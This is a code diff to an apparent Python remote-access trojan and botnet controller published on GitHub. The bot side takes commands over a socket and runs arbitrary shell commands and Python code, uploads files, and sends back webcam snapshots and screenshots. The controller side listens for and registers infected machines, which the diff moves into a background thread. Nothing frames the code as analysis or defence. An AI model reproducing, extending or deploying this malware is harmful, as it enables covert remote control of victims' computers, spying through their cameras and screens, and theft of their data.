@@ -1,10 +1,11 @@
 # github.com/ycy20090311
-# 2022.12.28
+# 2023
 
 # Python Library
 import time
 import socket
 import base64
+import threading
 
 # Bots Dictionaries
 # BotSocket:SystemInfo
@@ -33,7 +34,7 @@ try:
                 RecvMsg += BotSocket.recv(1024)
             try:
                 if RecvMsg.split()[0] == b"shell":
-                    shell = subprocess.Popen(RecvMsg.split(b" ",1)[1],shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+                    shell = subprocess.Popen(RecvMsg.split(b" ",1)[1].decode(),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                     SendMsg = b"shell %b" % shell.stdout.read() + shell.stderr.read()
                 elif RecvMsg.split()[0] == b"pycode":
                     exec(RecvMsg.split(b" ",1)[1])
@@ -48,15 +49,15 @@ try:
                     RecvFile.close()
                     SendMsg = b"putfile ok"
                 elif RecvMsg.split()[0] == b"webcamsnap":
-                    WebCamsnap = cv2.VideoCapture(0)
-                    Out,Image = WebCamsnap.read()
-                    if Out == True:SendMsg = b"webcamsnap %b %b" % (RecvMsg.split(b" ",2)[1],cv2.imencode(".jpg",Image)[1].tobytes())
+                    Webcamsnap = cv2.VideoCapture(0)
+                    Return,Image = Webcamsnap.read()
+                    if Return == True:SendMsg = b"webcamsnap %b %b" % (RecvMsg.split(b" ",2)[1],cv2.imencode(".jpg",Image)[1].tobytes())
                     else:SendMsg = b"webcamsmap no"
                 elif RecvMsg.split()[0] == b"screenshot":
-                    Image = pyscreenshot.grab()
-                    Image.save(".screenshot.jpg")
-                    Image = cv2.imread(".screenshot.jpg")
-                    SendMsg = b"screenshot %b %b" % (RecvMsg.split(b" ",2)[1],cv2.imencode(".jpg",Image)[1].tobytes())
+                    Screenshot = pyscreenshot.grab()
+                    Screenshot.save(".screenshot.jpg")
+                    Screenshot = cv2.imread(".screenshot.jpg")
+                    SendMsg = b"screenshot %b %b" % (RecvMsg.split(b" ",2)[1],cv2.imencode(".jpg",Screenshot)[1].tobytes())
                     os.remove(".screenshot.jpg")
                 else:
                     SendMsg = b"command no"
@@ -82,15 +83,24 @@ def Generate(FilePath,ControlIp,ControlPort):
 
 # Listen Port
 def Listen(ControlHost,ControlPort):
-    ControlSocket = socket.socket()
-    ControlSocket.bind((ControlHost,int(ControlPort)))
-    ControlSocket.listen()
-    while True:
-        BotSocket,BotAddr = ControlSocket.accept()
-        RecvMsg = BotSocket.recv(1024)
-        if RecvMsg.split()[0] == b"systeminfo":
-            Bots[BotSocket] = "%s %s" % (RecvMsg.split(b" ",1)[1].decode(),BotSocket.getpeername()[0])
-
+    def ThreadListen():
+        try:
+            ControlSocket = socket.socket()
+            ControlSocket.bind((ControlHost,int(ControlPort)))
+            ControlSocket.listen()
+            while True:
+                BotSocket,BotAddr = ControlSocket.accept()
+                RecvMsg = BotSocket.recv(1024)
+                if RecvMsg.split()[0] == b"systeminfo":
+                    Bots[BotSocket] = "%s %s" % (RecvMsg.split(b" ",1)[1].decode(),BotSocket.getpeername()[0])
+        except ConnectionResetError:
+            pass
+    try:
+        threading.Thread(target=ThreadListen).start()
+        return "listen ok"
+    except:
+        return "listen no"
+        
 # Print Bots
 def ListBot():
     BotList = ""
